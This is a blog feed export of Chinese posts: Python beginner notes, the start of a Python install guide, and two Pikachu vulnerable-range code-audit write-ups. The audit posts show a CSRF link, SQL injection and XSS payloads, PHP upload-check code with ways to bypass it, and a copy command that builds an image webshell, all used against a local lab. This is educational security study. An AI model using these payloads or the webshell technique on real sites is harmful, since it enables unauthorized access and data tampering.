      <title>Python学习日记（三）</title>
      <link href="/2022/02/13/python_three/"/>
      <url>/2022/02/13/python_three/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140314066.png" alt="在这里插入图片描述"></p><h1 id="一、注释"><a href="#一、注释" class="headerlink" title="一、注释"></a>一、注释</h1><p>注释是对代码的解释说明，不是所有代码都需要注释，只是那些难于理解又关键的代码，必须加注释，方便自己或其他人后期阅读。<br>&#x3D;&#x3D;注释的内容不会被python解释器 ，解释执行。&#x3D;&#x3D;<br>##1、注释的两种方式<br>###（1）单行注释<br>井号+注释内容<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a79ab4d0809a4ede87d9e99126c0e903.png" alt="在这里插入图片描述"></p><h3 id="（2）多行注释"><a href="#（2）多行注释" class="headerlink" title="（2）多行注释"></a>（2）多行注释</h3><p>三个单引号&#x2F;三个双引号+注释内容<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d8b5c1650941489d8834222814c30fac.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;也可以选中要注释的段落，按ctrl+&#x2F;。&#x3D;&#x3D;</p><h1 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h1><h2 id="1、什么是变量"><a href="#1、什么是变量" class="headerlink" title="1、什么是变量"></a>1、什么是变量</h2><p>变量就是可以变化的量，这个量指的是事物的。状态，比如说人的年龄，今天的天气。<br>在计算机中变量指的是 内存中的一段空间<br>##2、为什么要有变量<br>为了让计算机能够像人一样去记忆事物的某种状态，并且状态是可以发生变化的。<br>详细地说：<br><strong>程序执行的本质就是一系列状态的变化，变化是程序执行的直接体现，所以我们需要有一种机制能够反映或者说是保存下来程序执行时状态，以及状态的变化。</strong><br>##3、怎么使用变量<br><strong>变量一定是，先定义后使用。</strong></p><p>变量的三大组成部分，如下图<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8743a5de410241eaa8960a6f5e841b52.png" alt="在这里插入图片描述"></p><h2 id="4、变量名的命名规范"><a href="#4、变量名的命名规范" class="headerlink" title="4、变量名的命名规范"></a>4、变量名的命名规范</h2><ul><li><p>变量名只能由 字母、数字、下划线 组成。</p></li><li><p>变量名不能以数字开头。</p></li><li><p>变量名不能是Python内置关键字，如：</p></li><li><p>‘and’, ‘as’, ‘assert’, ‘break’, ‘class’, ‘continue’, ‘def’, ‘del’, ‘elif’, ‘else’, ‘except’, ‘exec’, ‘finally’, ‘for’, ‘from’, ‘global’, ‘if’, ‘import’, ‘in’, ‘is’, ‘lambda’, ‘not’, ‘or’, ‘pass’, ‘print’, ‘raise’, ‘return’, ‘try’, ‘while’, ‘with’, ‘yield’</p></li></ul><p>可以通过<br>import keyword</p><p>print(keyword.kwlist)    # 打印所有的关键字<br><strong>命名的两种风格</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 风格一：驼峰体</span></span><br><span class="line">AgeOfTony = <span class="number">56</span> </span><br><span class="line">NumberOfStudents = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 风格二：纯小写+下划线(在python中，变量名的命名推荐使用该风格)</span></span><br><span class="line">age_of_tony = <span class="number">56</span> </span><br><span class="line">age = <span class="number">18</span></span><br><span class="line">number_of_students = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推荐</span></span><br><span class="line">变量的命名是见名知意</span><br><span class="line">**变量名的不推荐命名**</span><br><span class="line"></span><br><span class="line">- 采用拼音，用汉字命名，变量名过长，这些都是不推荐的，实际开发中，一定不要采用这种。</span><br></pre></td></tr></table></figure><h1 id="三、is与-x3D-x3D"><a href="#三、is与-x3D-x3D" class="headerlink" title="三、is与&#x3D;&#x3D;"></a>三、is与&#x3D;&#x3D;</h1><h2 id="1、id"><a href="#1、id" class="headerlink" title="1、id"></a>1、id</h2><p>之前我们讲到过变量名绑定的是变量值的内存地址，那么不同的变量名可能绑定的内存地址是不同的，那么怎么能体现这一点呢？python解释器给我们提供了<strong>id（）</strong>这个函数。（函数后面会介绍）通过<code>id(变量名)</code> 会返回一串id号码，这串id号码就对应着这个变量值的内存地址。那么我们就可以通过比较id号码，来判断不同变量名指向的内存地址是否相同。id( )返回对象当前的内存地址，内存地址不同id自然不同。<br>##2、is<br>比较的是左右两边的id是否相等</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;100&#x27;</span></span><br><span class="line">y = x</span><br><span class="line">print(x is y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h2 id="3、-x3D-x3D"><a href="#3、-x3D-x3D" class="headerlink" title="3、&#x3D;&#x3D;"></a>3、&#x3D;&#x3D;</h2><p>比较的是左右两边的值是否相等</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">print(x == y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong> id相等，即内存地址必然相等，即值必然相等。但是值相等，但id不一定相等，内存地址也不一定相等。<br>#四、小整数池<br>##1、什么是小整数池<br>就是当你的python解释器启动的那一刻，会在内存中事先申请好一系列的内存空间存在一些常用的整数。<br>这个整数的返回是【-5 , 256】。<br>##2、小整数池有什么用<br>这样一些我们常用的小整数就不需要我们来回创建了，直接从小整数池中取。<br>#五、常量<br>##1、什么是常量<br>常量就是不变的量，但是在python中是没有常量概念的，人们约定俗成用全部大写的英文单词代表常量。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NAME = <span class="string">&quot;我是一个常量&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2、为什么要有常量"><a href="#2、为什么要有常量" class="headerlink" title="2、为什么要有常量"></a>2、为什么要有常量</h2><p>在程序运行过程中，有些值是固定的、不应该被改变，比如圆周率 3.141592653…<br>##3、怎么使用常量<br>在Python中没有一个专门的语法定义常量，约定俗成是用全部大写的变量名表示常量。如：PI&#x3D;3.14159。所以单从语法层面去讲，常量的使用与变量完全一致。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>皮卡丘靶场源码审计（二）</title>
      <link href="/2022/02/03/pikachu_code_two/"/>
      <url>/2022/02/03/pikachu_code_two/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/5bf121206386499ba2a6966ec192853c.png" alt="在这里插入图片描述"></p><p>图片来源于百度图片。<br>本篇文章仅用于自我学习，笔记记录，不得用于其他违规用途。</p><h1 id="一、CSRF代码审计"><a href="#一、CSRF代码审计" class="headerlink" title="一、CSRF代码审计"></a>一、CSRF代码审计</h1><h2 id="1、CSRF（GET）"><a href="#1、CSRF（GET）" class="headerlink" title="1、CSRF（GET）"></a>1、CSRF（GET）</h2><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bd1e2ac357d6487a8d822bc5839a851e.png" alt="在这里插入图片描述"></p><p>漏洞复现<br>登录vince账户，点击修改信息，抓到包可以发现是get方式更改信息，我们只需要构造链接，使登录admin账户的用户点击，即可更改admin账户的信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/268a20bfc6584c29aacd3614a38ae37d.png" alt="在这里插入图片描述"><br>构造好的链接：<a href="http://pikaqiu/vul/csrf/csrfget/csrf_get_edit.phpcsrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=13255555555&amp;add=22222&amp;email=111111&amp;submit=submit">http://pikaqiu/vul/csrf/csrfget/csrf_get_edit.phpcsrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=13255555555&amp;add=22222&amp;email=111111&amp;submit=submit</a><br>登录admin账户，这是此时admin的信息：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/90dca403b6e14a799088b04eb3a3c602.png" alt="在这里插入图片描述"><br>然后点击构造好的链接，可以发现admin的信息改变了。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5b21b43a817949fa8a2eb4c9a5065b08.png" alt="在这里插入图片描述"></p><h2 id="2、CSRF（POST）"><a href="#2、CSRF（POST）" class="headerlink" title="2、CSRF（POST）"></a>2、CSRF（POST）</h2><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/422977e14c794ded84e104e9b129bc71.png" alt="在这里插入图片描述"><br>只是变成了post传参。<br>漏洞复现<br>登录vince，修改信息，抓包，右键使用burp生成csrf poc。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3461bf9efe6a4b88bd92aa2802becd28.png" alt="在这里插入图片描述"><br>复制到html里，下图是admin现在信息：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bf6a7a6b059344dfa0a9c69e04f10afb.png" alt="在这里插入图片描述"><br>在admin账户是登录的情况下，点击刚刚做好的html。<br>可以看到信息已经改变了：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ab1331751cff4748b8ac3394ee8a2bd6.png" alt="在这里插入图片描述"></p><h2 id="3、CSRF（Token）"><a href="#3、CSRF（Token）" class="headerlink" title="3、CSRF（Token）"></a>3、CSRF（Token）</h2><p>加入token验证后就无法通过了，每次都会生成一串随机的token。</p><h1 id="二、文件包含代码审计"><a href="#二、文件包含代码审计" class="headerlink" title="二、文件包含代码审计"></a>二、文件包含代码审计</h1><h2 id="1、本地文件包含"><a href="#1、本地文件包含" class="headerlink" title="1、本地文件包含"></a>1、本地文件包含</h2><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ff92314f10804c2aae4a58bbfc4f8d94.png" alt="在这里插入图片描述"></p><p>漏洞复现<br>选择一个球星的话，会弹出照片，代码可以看出这个照片没有做严格的过滤，重新选择，抓包，修改包含的文件，在phpstudy根目录写了一个phpinfo。可以在url直接修改，也可以抓包。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d139428f7df64a39a1cf1c208044f417.png" alt="在这里插入图片描述"></p><h2 id="2、远程文件包含"><a href="#2、远程文件包含" class="headerlink" title="2、远程文件包含"></a>2、远程文件包含</h2><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2dffd639be244ca79e9f474c177f6010.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/2dc1ed1692e2455a9101ee6613bab689.png" alt="在这里插入图片描述"></p><p>漏洞复现<br>远程的话和本地的url差不多，url中吧include函数的完整参数给出来了。<br>所以除了远程文件包含，还可以用本地包含使用绝对路径。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/fb878c6c610c45ffa66c067e91e3a174.png" alt="在这里插入图片描述"></p><h1 id="三、SSRF代码审计"><a href="#三、SSRF代码审计" class="headerlink" title="三、SSRF代码审计"></a>三、SSRF代码审计</h1><h2 id="1、SSRF（CURL）"><a href="#1、SSRF（CURL）" class="headerlink" title="1、SSRF（CURL）"></a>1、SSRF（CURL）</h2><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1ed05b8f51f241079b89db40f01c244b.png" alt="在这里插入图片描述"></p><p>点击后可以发现链接中使用了url？&#x3D;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/76ed3629d0c44819819d77106546d3c6.png" alt="在这里插入图片描述"></p><p>漏洞复现<br>所以我们之间更改url后面的路径，尝试读取敏感信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3dec222d66a9451195240114c6a90547.png" alt="在这里插入图片描述"></p><h2 id="2、SSRF（File-get-content）"><a href="#2、SSRF（File-get-content）" class="headerlink" title="2、SSRF（File-get-content）"></a>2、SSRF（File-get-content）</h2><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/82201bae44a04cedad1e5563c5ac0807.png" alt="在这里插入图片描述"><br>同之前一样，但题目提示我们使用file_get_content()函数<br>与url一样的目的是为读取文件，不同的是它可以更加细致的读取文件。<br>漏洞复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6f41b3b6dbc44858b004bb0f9f76f22f.png" alt="在这里插入图片描述"></p><h1 id="四、XXE代码审计"><a href="#四、XXE代码审计" class="headerlink" title="四、XXE代码审计"></a>四、XXE代码审计</h1><p>查看源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/950ed5f8dfe548ac900877b614848709.png" alt="在这里插入图片描述"></p><p>漏洞复现<br>构造payload，读取敏感信息，这里使用file，只能用绝对路径。<br><?xml version="1.0"?></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/image-20230403135744769.png" alt="image-20230403135744769"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>皮卡丘靶场源码审计（一）</title>
      <link href="/2022/02/01/pikachu_code_one/"/>
      <url>/2022/02/01/pikachu_code_one/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/be10fcd02e0a48ffad80e986e01f1d4f.png" alt="在这里插入图片描述"><br>图片来源于百度图片。<br>&#x3D;&#x3D;注意：本篇文章仅用于学习以及笔记记录，不得用于其他违规用途。&#x3D;&#x3D;</p><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>首先搭建Pikachu靶场环境。<br><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>将下载好的pikachu文件夹放到phpstudy的web服务器根目录下，根据实际情况修改inc&#x2F;config.inc.php里面的数据库连接设置，<br>访问pikachu网址，点击初始化安装，即可完成安装。<br>#二、SQL注入代码审计<br>##1、数字型SQL注入<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7d3b3d1364914faa837ad59143ca10d9.png" alt="在这里插入图片描述"><br>如图所示为SQL数字型注入页面，找到该网页源码。<br>下图为关键代码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ce488e5206224cc9bdee4f17c32bd1b3.png" alt="在这里插入图片描述"><br>这里面的SQL语句前后无过滤和判断，使用burp抓包复现：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2701448ab84c474c919ea00d9d73ed27.png" alt="在这里插入图片描述"><br>复现出这种即可证明存在该漏洞。</p><h2 id="2、字符型SQL注入"><a href="#2、字符型SQL注入" class="headerlink" title="2、字符型SQL注入"></a>2、字符型SQL注入</h2><p>查看源代码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e682bba2caaf4c39beff90c843912c4f.png" alt="在这里插入图片描述"><br>漏洞复现：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f670ccafb0a1407d9951c2cf639e3a42.png" alt="在这里插入图片描述"></p><h2 id="3、http头注入"><a href="#3、http头注入" class="headerlink" title="3、http头注入"></a>3、http头注入</h2><p>查看源码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5a17e4bede1543c5addc12e33cb2a525.png" alt="在这里插入图片描述"><br>漏洞复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0e51be766a1245f1bc2646da8e114b63.png" alt="在这里插入图片描述"></p><h2 id="4、盲注"><a href="#4、盲注" class="headerlink" title="4、盲注"></a>4、盲注</h2><p>查看源码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/54f5cc18efce4e359e8e1a05bb85d3b4.png" alt="在这里插入图片描述"><br>漏洞复现：<br>payload：<br>kobe’%20and%20’1’&#x3D;’1<br>kobe’%20and%20’1’&#x3D;’2<br><img src="http://120.48.107.243:9090/blog/2023/04/03/143711f57e8f43fc911d6783a0ecb137.png" alt="在这里插入图片描述"></p><h2 id="5、宽字节注入"><a href="#5、宽字节注入" class="headerlink" title="5、宽字节注入"></a>5、宽字节注入</h2><p>查看源码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5092e190fe084a04bc9a6ccf6618c96e.png" alt="在这里插入图片描述"><br>漏洞复现：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5f6d6562e9ac4ea1b87057122c05526d.png" alt="在这里插入图片描述"></p><h1 id="三、XSS代码审计"><a href="#三、XSS代码审计" class="headerlink" title="三、XSS代码审计"></a>三、XSS代码审计</h1><h2 id="1、反射型XSS"><a href="#1、反射型XSS" class="headerlink" title="1、反射型XSS"></a>1、反射型XSS</h2><p>查看源码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b197a1d8947f42d0a1a1153b9a1fab8c.png" alt="在这里插入图片描述"><br>漏洞复现：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ab1623c20cc1426f91fcf54abb51c327.png" alt="在这里插入图片描述"><br>输入<input onfocus="alert('xss');" autofocus><br><img src="http://120.48.107.243:9090/blog/2023/04/03/55f456c929ee415692e11a84f1ebae33.png" alt="在这里插入图片描述"></p><h2 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h2><p>查看源码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/959f1a1b80b24de4a868ff8e626eb2f0.png" alt="在这里插入图片描述"><br>直接输出用户提交的数据 , 触发储存型XSS<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b0dfc50611794dcabc8eb454178d260b.png" alt="在这里插入图片描述"><br>漏洞复现：<br><img src="https://img-blog.csdnimg.cn/4e0480bd0b4548a6af3ff6200c11799c.png" alt="在这里插入图片描述"></p><h1 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h1><h2 id="1、前端限制"><a href="#1、前端限制" class="headerlink" title="1、前端限制"></a>1、前端限制</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4de39bee0c544a7a9c98b5ec86f3224d.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/379221461313452497fcca9f7a899c89.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/f89d8a95271a45f789404f9726ef3e97.png" alt="在这里插入图片描述"></p><h2 id="2、服务端校验"><a href="#2、服务端校验" class="headerlink" title="2、服务端校验"></a>2、服务端校验</h2><p>代码分析：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e4c94c2c110841d5b4fca0bd21fe58af.png" alt="在这里插入图片描述">具体函数定义<br>&#x2F;&#x2F;只通过MIME类型验证了一下图片类型，其他的无验证,upsafe_upload_check.php<br>function upload_sick($key,$mime,$save_path){<br>    $arr_errors&#x3D;array(<br>        1&#x3D;&gt;’上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值’,<br>        2&#x3D;&gt;’上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值’,<br>        3&#x3D;&gt;’文件只有部分被上传’,<br>        4&#x3D;&gt;’没有文件被上传’,<br>        6&#x3D;&gt;’找不到临时文件夹’,<br>        7&#x3D;&gt;’文件写入失败’<br>    );<br>    &#x2F;&#x2F; $_FILES是一个全局数组变量 , 元素也是一个数组 , key为固定的uploadfile<br>    &#x2F;&#x2F; 判断是否上传失败<br>    if(!isset($_FILES[$key][‘error’])){<br>        $return_data[‘error’]&#x3D;’请选择上传文件！’;<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    &#x2F;&#x2F; 判断是否上传失败<br>    if ($_FILES[$key][‘error’]!&#x3D;0) {<br>        $return_data[‘error’]&#x3D;$arr_errors[$_FILES[$key][‘error’]];<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    &#x2F;&#x2F;验证一下MIME类型 $mime为白名单数组 , 判断如果不在白名单数组中<br>    &#x2F;&#x2F;恰巧  $key][‘type’] 前端可控可以绕过<br>    if(!in_array($_FILES[$key][‘type’], $mime)){<br>        &#x2F;&#x2F; 提示错误信息<br>        $return_data[‘error’]&#x3D;’上传的图片只能是jpg,jpeg,png格式的！’;<br>        &#x2F;&#x2F; 返回 false<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    &#x2F;&#x2F;新建一个保存文件的目录<br>    if(!file_exists($save_path)){<br>        if(!mkdir($save_path,0777,true)){<br>            $return_data[‘error’]&#x3D;’上传文件保存目录创建失败，请检查权限!’;<br>            $return_data[‘return’]&#x3D;false;<br>            return $return_data;<br>        }<br>    }<br>    $save_path&#x3D;rtrim($save_path,’&#x2F;‘).’&#x2F;‘;&#x2F;&#x2F;给路径加个斜杠<br>    if(!move_uploaded_file($_FILES[$key][‘tmp_name’],$save_path.$_FILES[$key][‘name’])){<br>        $return_data[‘error’]&#x3D;’临时文件移动失败，请检查权限!’;<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    &#x2F;&#x2F;如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去)<br>    $return_data[‘new_path’]&#x3D;$save_path.$_FILES[$key][‘name’];<br>    $return_data[‘return’]&#x3D;true;<br>    return $return_data;</p><p>}<br>$_FILES</p><p>array(1) {<br>  [“uploadfile”]&#x3D;&gt;<br>  array(5) {<br>    [“name”]&#x3D;&gt;<br>    string(11) “phpinfo.php”<br>    [“type”]&#x3D;&gt;<br>    string(24) “application&#x2F;octet-stream”<br>    [“tmp_name”]&#x3D;&gt;<br>    string(53) “C:\Users\Administrator\AppData\Local\Temp\php8374.tmp”<br>    [“error”]&#x3D;&gt;<br>    int(0)<br>    [“size”]&#x3D;&gt;<br>    int(23)<br>  }<br>}<br>由代码分析得知，服务端只校验了MIME类型，不校验文件后缀 , 直接修改绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4dd8c546e9bb469d9b78d4e328d84d06-20230403135212836.png" alt="在这里插入图片描述"></p><h2 id="3、文件头检验"><a href="#3、文件头检验" class="headerlink" title="3、文件头检验"></a>3、文件头检验</h2><p>查看源代码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f317ac2a1462476389f89b80e687bd2c.png" alt="在这里插入图片描述"><br>校验函数是 upload , 跟进查看upload<br>&#x2F;&#x2F;进行了严格的验证<br>function upload($key,$size,$type&#x3D;array(),$mime&#x3D;array(),$save_path){<br>    $arr_errors&#x3D;array(<br>        1&#x3D;&gt;’上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值’,<br>        2&#x3D;&gt;’上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值’,<br>        3&#x3D;&gt;’文件只有部分被上传’,<br>        4&#x3D;&gt;’没有文件被上传’,<br>        6&#x3D;&gt;’找不到临时文件夹’,<br>        7&#x3D;&gt;’文件写入失败’<br>    );<br>   &#x2F;&#x2F; var_dump($_FILES);<br>    if(!isset($_FILES[$key][‘error’])){<br>        $return_data[‘error’]&#x3D;’请选择上传文件！’;<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    if ($_FILES[$key][‘error’]!&#x3D;0) {<br>        $return_data[‘error’]&#x3D;$arr_errors[$_FILES[$key][‘error’]];<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    &#x2F;&#x2F; 上面两个是查看是否上传失败的 , 无关紧要 , 接着看下面的过滤,限制<br>    &#x2F;&#x2F;验证上传方式 , POST<br>    if(!is_uploaded_file($_FILES[$key][‘tmp_name’])){<br>        $return_data[‘error’]&#x3D;’您上传的文件不是通过 HTTP POST方式上传的！’;<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }<br>    &#x2F;&#x2F;获取后缀名，如果不存在后缀名，则将变量设置为空<br>    &#x2F;&#x2F; pathinfo() 函数以数组的形式返回关于文件路径的信息。<br>    $arr_filename&#x3D;pathinfo($_FILES[$key][‘name’]);<br>    &#x2F;&#x2F; 判断是否有后缀<br>    if(!isset($arr_filename[‘extension’])){<br>        $arr_filename[‘extension’]&#x3D;’’;<br>    }<br>    &#x2F;&#x2F;先验证后缀名 , 后缀名转成小写然后判断是否在 $type 白名单后缀中<br>    if(!in_array(strtolower($arr_filename[‘extension’]),$type)){&#x2F;&#x2F;转换成小写，在比较<br>        $return_data[‘error’]&#x3D;’上传文件的后缀名不能为空，且必须是’.implode(‘,’,$type).’中的一个’;<br>        $return_data[‘return’]&#x3D;false;<br>        return $return_data;<br>    }</p><pre><code>//验证MIME类型，MIME类型可以被绕过 if(!in_array($_FILES[$key][&#39;type&#39;], $mime))&#123;    $return_data[&#39;error&#39;]=&#39;你上传的是个假图片，不要欺骗我xxx！&#39;;    $return_data[&#39;return&#39;]=false;    return $return_data;&#125;//通过getimagesize来读取图片的属性，从而判断是不是真实的图片，还是可以被绕过的// getimagesize(文件名) 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 if(!getimagesize($_FILES[$key][&#39;tmp_name&#39;]))&#123;    $return_data[&#39;error&#39;]=&#39;你上传的是个假图片，不要欺骗我！&#39;;    $return_data[&#39;return&#39;]=false;    return $return_data;&#125;//验证大小if($_FILES[$key][&#39;size&#39;]&gt;$size)&#123;    $return_data[&#39;error&#39;]=&#39;上传文件的大小不能超过&#39;.$size.&#39;byte(500kb)&#39;;    $return_data[&#39;return&#39;]=false;    return $return_data;&#125;//把上传的文件给他搞一个新的路径存起来if(!file_exists($save_path))&#123;    if(!mkdir($save_path,0777,true))&#123;        $return_data[&#39;error&#39;]=&#39;上传文件保存目录创建失败，请检查权限!&#39;;        $return_data[&#39;return&#39;]=false;        return $return_data;    &#125;&#125;//生成一个新的文件名，并将新的文件名和之前获取的扩展名合起来，形成文件名称$new_filename=str_replace(&#39;.&#39;,&#39;&#39;,uniqid(mt_rand(100000,999999),true));if($arr_filename[&#39;extension&#39;]!=&#39;&#39;)&#123;    $arr_filename[&#39;extension&#39;]=strtolower($arr_filename[&#39;extension&#39;]);//小写保存    $new_filename.=&quot;.&#123;$arr_filename[&#39;extension&#39;]&#125;&quot;;&#125;//将tmp目录里面的文件拷贝到指定目录下并使用新的名称$save_path=rtrim($save_path,&#39;/&#39;).&#39;/&#39;;if(!move_uploaded_file($_FILES[$key][&#39;tmp_name&#39;],$save_path.$new_filename))&#123;    $return_data[&#39;error&#39;]=&#39;临时文件移动失败，请检查权限!&#39;;    $return_data[&#39;return&#39;]=false;    return $return_data;&#125;//如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）$return_data[&#39;save_path&#39;]=$save_path.$new_filename;$return_data[&#39;filename&#39;]=$new_filename;$return_data[&#39;return&#39;]=true;return $return_data;&#125;</code></pre><p>这个时候发现只能使用图片马绕过<br>使用CMD制作一句话木马。<br>参数&#x2F;b指定以二进制格式复制、合并文件; 用于图像类&#x2F;声音类文件<br>参数&#x2F;a指定以ASCII格式复制、合并文件。用于txt等文档类文件</p><p>copy 1.jpg&#x2F;b+1.php 2.jpg<br>&#x2F;&#x2F;意思是将1.jpg以二进制与1.php合并成2.jpg<br>那么2.jpg就是图片木马了。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f04d0219a33e42ac8293841210d21ceb.png" alt="在这里插入图片描述"></p><h1 id="五、命令执行"><a href="#五、命令执行" class="headerlink" title="五、命令执行"></a>五、命令执行</h1><p>查看源代码：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ec3bc8087edf4e468c640456718cdcbd.png" alt="在这里插入图片描述"><br>漏洞复现：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/98510591f4eb466384922f649a91e098.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（二）</title>
      <link href="/2022/01/28/python_two/"/>
      <url>/2022/01/28/python_two/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140605582.png" alt="在这里插入图片描述"></p><h1 id="一、Python的安装"><a href="#一、Python的安装" class="headerlink" title="一、Python的安装"></a>一、Python的安装</h1><h2 id="1、Windows安装Python"><a href="#1、Windows安装Python" class="headerlink" title="1、Windows安装Python"></a>1、Windows安装Python</h2><h2 id="（1）安装Python3"><a href="#（1）安装Python3" class="headerlink" title="（1）安装Python3"></a>（1）安装Python3</h2><p>官网下载地址：<a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/97f7ed0e807e4ceab55a10b0fcfb711e.png" alt="在这里插入图片描述"><br>当前python3最先版本已经是python3.10了<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6f623436850f44b78c8c4fcd08b5e9b3.png" alt="在这里插入图片描述"><br>然后下载完成就是双击安装下一步 , 下一步 , <code>记住你的安装目录</code> , 因为后面添加环境变量会用到 , 不推荐默认安装在c盘。<br>&#x3D;&#x3D;注意：如果下载很慢，可以去镜像站下载：<a href="http://npm.taobao.org/mirrors/python/3.9.7/==">http://npm.taobao.org/mirrors/python/3.9.7/==</a></p><h3 id="（2）安装Python2"><a href="#（2）安装Python2" class="headerlink" 